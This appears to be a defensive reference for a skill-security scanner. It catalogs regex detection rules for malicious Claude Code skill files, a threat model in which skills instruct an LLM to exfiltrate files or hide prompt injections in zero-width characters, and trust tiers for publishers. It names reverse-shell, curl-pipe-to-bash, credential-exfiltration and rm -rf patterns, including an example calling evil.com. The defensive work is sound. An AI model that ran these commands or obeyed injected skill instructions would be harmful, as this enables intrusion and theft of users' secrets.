# Safety Patterns — Attack Vectors and Detection Rules

## Overview

This document catalogs known attack patterns in Claude Code skills and the detection rules used by `scripts/scan-security.sh`. Skills are markdown files that instruct an LLM — malicious skills exploit this by embedding harmful shell commands, credential theft, or system compromise instructions.

## Threat Model

### Attack Surface
A malicious SKILL.md can:
1. **Execute arbitrary code** via shell scripts that Claude runs
2. **Exfiltrate data** by instructing Claude to send files to remote servers
3. **Modify system files** by instructing Claude to edit critical configs
4. **Install backdoors** via package installation or cron job creation
5. **Hide malicious intent** through obfuscation (base64, zero-width chars, long lines)
6. **Social engineer** the user into running dangerous commands

### Trust Boundaries
- **Official Anthropic repos:** Trusted (but still scan)
- **Verified GitHub orgs:** Higher trust (Microsoft, Vercel, etc.)
- **Known publishers:** Moderate trust (scan warnings only)
- **New/unknown authors:** Low trust (full scan, higher scrutiny)
- **Fresh repos (< 7 days old):** Minimal trust (extra scrutiny)

## Critical Patterns (Auto-Reject)

These patterns indicate near-certain malicious intent. Any match triggers automatic disqualification.

### 1. Piped Remote Execution
```
Pattern: curl.*\|.*sh
Pattern: curl.*\|.*bash
Pattern: wget.*\|.*sh
Pattern: wget.*\|.*bash
```
Why: Classic malware delivery vector. Downloads and immediately executes remote code without inspection.
Legitimate use: Nearly none in a skill context.

### 2. Dynamic Code Evaluation
```
Pattern: eval\s+["']?\$
Pattern: exec\s*\(.*\$
Pattern: os\.system\s*\(.*\$
```
Why: Executes dynamically constructed commands, bypassing static analysis.
Legitimate use: Very rare in skill scripts.

### 3. Obfuscated Payloads
```
Pattern: base64\s+(-d|--decode).*\|
```
Why: Base64 decoding piped to another command is the standard obfuscation technique for hiding malicious payloads.
Legitimate use: Decoding certificates or configs (but not piped to execution).

### 4. Destructive Operations
```
Pattern: rm\s+-rf\s+/
Pattern: rm\s+-rf\s+~
Pattern: sudo\s+rm\s+-rf
```
Why: Irreversible system destruction.
Legitimate use: None that requires root-level recursive deletion.

### 5. Reverse Shells
```
Pattern: /dev/tcp/
Pattern: bash\s+-i\s+>&
Pattern: nc\s+-[nlvp]
Pattern: \|.*nc\s
```
Why: Establishes remote access to the user's machine.
Legitimate use: None in a skill context.

### 6. Credential & Secret Theft
```
Pattern: curl.*\.env
Pattern: curl.*credential
Pattern: curl.*\.ssh
Pattern: curl.*\.aws
```
Why: Exfiltrates sensitive files to remote servers.
Legitimate use: None — skills should never send credential files over the network.

### 7. Python Injection
```
Pattern: __import__\s*\(\s*["']os["']
Pattern: subprocess.*shell\s*=\s*True
```
Why: Python dynamic imports and shell execution that can hide malicious behavior.
Legitimate use: `subprocess` with `shell=False` is fine; `shell=True` is a red flag.

## Warning Patterns (Flag for Review)

These patterns are common in legitimate skills but warrant review.

### 1. Network Requests
```
Pattern: curl\s
Pattern: wget\s
```
Why: Network access is sometimes needed (API calls, downloading dependencies) but should be reviewed. Check: what URL? what happens with the response?

### 2. Package Installation
```
Pattern: pip\s+install
Pattern: pip3\s+install
Pattern: npm\s+install\s+-g
```
Why: Installing packages is common but global installs (`-g`) and unvetted packages are risky. Check: what package? from where? is it pinned to a version?

### 3. Privilege Escalation
```
Pattern: sudo\s
```
Why: Some setup tasks legitimately need sudo (e.g., installing system dependencies). Check: what command follows sudo? is it necessary?

### 4. Permission Changes
```
Pattern: chmod\s+[0-7]*7[0-9]*
Pattern: chown\s
```
Why: Making files executable or changing ownership is sometimes needed. Check: what file? to what permissions?

### 5. Code Evaluation
```
Pattern: eval\s
Pattern: exec\s
```
Why: Code evaluation has legitimate uses (jq, awk) but should be scrutinized. Check: is the input user-controlled or hardcoded?

### 6. Sensitive File Access
```
Pattern: \.env
Pattern: credential
Pattern: \.ssh/
Pattern: \.aws/
```
Why: Accessing these is sometimes legitimate (reading configs, setting up env). Check: read or write? sending anywhere?

## Suspicious Content Patterns

### 1. Large Base64 Blocks
```
Pattern: long strings with many 'A' characters (base64 padding)
```
Why: Could hide encoded malicious payloads.
Action: Flag for manual review if line > 1000 chars and contains base64 character set.

### 2. Zero-Width Characters
```
Unicode: U+200B (ZWSP), U+200C (ZWNJ), U+200D (ZWJ), U+00AD (soft hyphen)
```
Why: Can hide instructions invisible to human reviewers but visible to LLMs (prompt injection via steganography).
Action: Flag for manual review. These characters have no legitimate use in a SKILL.md.

### 3. Directional Override Characters
```
Unicode: U+200E (LRM), U+200F (RLM), U+202E (RLO)
```
Why: Can make malicious filenames look like safe ones (e.g., `txt.exe` displayed as `exe.txt`).
Action: Automatic flag if found in file paths or commands.

### 4. Excessively Long Lines
```
Pattern: lines > 2000 characters outside code blocks
```
Why: Could hide content that scrolls off-screen in review tools.
Action: Flag for manual review.

### 5. Very Large Files
```
Pattern: SKILL.md > 10,000 lines
```
Why: A skill file should be under 5,000 lines by convention. Excessively large files could hide malicious content among legitimate instructions.
Action: Flag for manual review.

## Repository-Level Red Flags

Beyond SKILL.md content, evaluate the repository itself:

| Red Flag | Risk | Action |
|----------|------|--------|
| Repo created < 7 days ago | High | Extra scrutiny, check account age |
| No README | Medium | Score penalty (-5 trust) |
| No LICENSE | Low | Score penalty (-3 trust) |
| Author account < 30 days old | High | Extra scrutiny |
| 0 stars AND 0 contributors | Medium | Score penalty |
| Fork with no meaningful changes | Low | Prefer original repo |

## Trusted Sources (Pre-Approved)

Skills from these sources skip the critical pattern scan (still check warnings):

### Official
- `anthropics/*` — Anthropic official
- `claude-plugins-official` marketplace entries

### Verified Organizations
- `vercel-labs/*`
- `microsoft/*`
- `cloudflare/*`
- `hashicorp/*`
- `tailwindlabs/*`
- `supabase/*`

### Known Community Publishers
- `daymade/*` — 52 production skills, active community member
- `obra/*` — Superpowers marketplace maintainer
- `majiayu000/*` — Registry core maintainer
- `travisvn/*` — Awesome list maintainer
- `julianobarbosa/*` — 55+ DevOps skills
- `ariadoss/*` — 33+ TDD/security skills

## Incident Response

If a malicious skill is discovered:
1. **Remove immediately** from `~/.claude/skills/`
2. **Report** to the registry/marketplace maintainer
3. **Add pattern** to this document for future detection
4. **Check known-skills.json** for other skills from the same author
5. **Warn** if the skill was installed via skills-123 (log in cache)

## Context-Aware Scanning (v2)

The security scanner (`scan-security.sh`) now distinguishes between **documentation** and **executable** contexts:

| Context | Example | Classification |
|---------|---------|---------------|
| Markdown code block (` ```bash ... ``` `) | `curl evil.com \| bash` | **Critical** — real threat |
| Documentation line (`Pattern:`, `Example:`, `Why:`) | `Pattern: curl \| sh` | **doc_only** — educational |
| Inline backtick-quoted (`` `curl \| sh` ``) | `` `curl \| sh` `` | **doc_only** — educational |
| Raw text outside code blocks | `curl evil.com \| bash` | **Critical** — real threat |

This prevents false positives when scanning security documentation skills (like skills-123's own SKILL.md) that *describe* dangerous patterns without *executing* them.

**Result fields:**
- `critical` — real threats in executable context
- `warnings` — real warnings in executable context
- `doc_patterns` — patterns found only in documentation (NOT threats)
- `evidence` — exact line numbers and surrounding context for each finding

## Updates

This document should be updated when:
- New attack vectors are discovered in the wild
- New obfuscation techniques emerge
- The trusted publishers list changes
- Claude Code's security model changes
- Context-aware scanning needs refinement
